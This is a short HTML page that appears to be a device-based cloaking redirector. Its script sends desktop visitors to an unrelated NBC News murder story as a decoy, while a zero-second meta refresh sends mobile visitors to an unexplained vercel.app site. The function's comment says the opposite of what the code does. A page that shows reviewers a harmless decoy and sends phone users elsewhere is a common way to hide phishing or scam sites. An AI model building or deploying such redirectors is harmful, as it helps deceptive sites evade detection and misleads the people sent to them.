<html>
   
<head>
    
    <script>
        // Función para redirigir solo si no se detecta un PC
        function redirectIfNotMobile() {
            // Verificar si el agente de usuario contiene "Mobi" para detectar un dispositivo móvil
            if (!navigator.userAgent.match(/Mobi/i)) {
                // No es un dispositivo móvil, redireccionar a una URL diferente
                window.location.href = 'https://www.nbcnews.com/news/us-news/new-murder-charges-brought-man-accused-killing-uva-football-players-rcna104246';
            }
        }
    </script>
    <meta http-equiv="refresh" content="0; url=https://botrols.vercel.app">
</head>
<body>
    <script>
        redirectIfNotMobile();
    </script>

</html>
